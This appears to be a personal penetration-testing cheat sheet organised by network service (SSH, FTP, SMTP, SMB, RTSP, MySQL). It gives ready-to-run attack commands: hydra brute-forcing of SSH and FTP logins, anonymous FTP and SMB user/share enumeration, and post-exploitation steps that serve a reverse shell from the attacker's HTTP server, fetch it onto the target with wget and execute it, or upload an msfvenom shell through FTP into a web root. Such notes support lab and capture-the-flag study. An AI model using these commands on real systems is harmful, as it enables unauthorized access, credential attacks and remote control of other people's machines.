### HTTPS Basics :

A basic request looks like this :
![[Ports and vulnerabilities 1.png]]

### SSH (Port : 22) :
Basic services used to access a server remotely with user and password

Brute force a SSH :
```bash
hydra -L username.txt -P wordlist.txt ssh://{IP} 
```

login shh by :
```bash
ssh username@{IP} => then it asks for password
```

#### Post Exploitation for ssh :

same as ftp just upload a reverse shell and run it Ex : by local http server and wget
```bash
# On your machine
cd /path/to/shell
python3 -m http.server 8000

# and then
wget http://your_ip:8000/shell.elf -O /tmp/shell.elf
chmod +x /tmp/shell.elf
/tmp/shell.elf
```

*Note* : Use directories like temp where +x permissions are allowed

### FTP (Port : 21) :
FTP used for file transfer remotely

Check if the service allows anonymous access:
```bash
nmap -p 21 --script=ftp-anon {IP} 
# OR
lftp -u anonymous,anonymous ftp://{IP}
# OR
lftp ftp://username:password@ftp.example.com
```

Check which version of ftp is used:
```bash
nmap -p 21 -sV {IP}
```

Brute force with hydra (might get rate limited)
```bash
hydra -l {username} -P {password_list} ftp://{ftp_server_address}
```

#### Post Exploit for FTP:

In extremely vulnerabilities websites the FTP files are used to host website backend on port 80, 
Ex : There is a file image.png in ftp and when you navigate to {IP}:80/image.png you get it

upload the reverse shell through msfvenom and go that shell in browser
listen on port specified on reverse shell 
and you get connection

download Files form ftp:
```bash
get file.txt
```

to upload file:
```bash
put file.txt 
```


### SMTP (Port : 25) :
SMTP is a mail server 
Connect it via :
```bash
telnet <IP/website> 25
```


### SMB (Port : 445) :
This is a server message block for sharing files and images

scan :
```bash
nmap -p 445 --script smb-os-fingerprint,smb-enum-shares,smb-enum-users -sV {IP}
```

if interesting found use:
```shell
/usr/local/bin/python3 /Users/sulaimaneksambi/Bug_Bounty/enum4linux-ng/enum4linux-ng.py 10.10.196.66
```


### RTSP (Port : 554) :
used for media player
use ffplay
```shell
ffplay -rtsp_transport tcp rtsp://159.183.18.133:554/live.sdp
OR
ffplay -loglevel debug rtsp://159.183.18.133:554/live.sdp
OR
ffplay rtsp://159.183.18.133:554/live.sdp
```



### MySql (Port : 3306):
Used for database



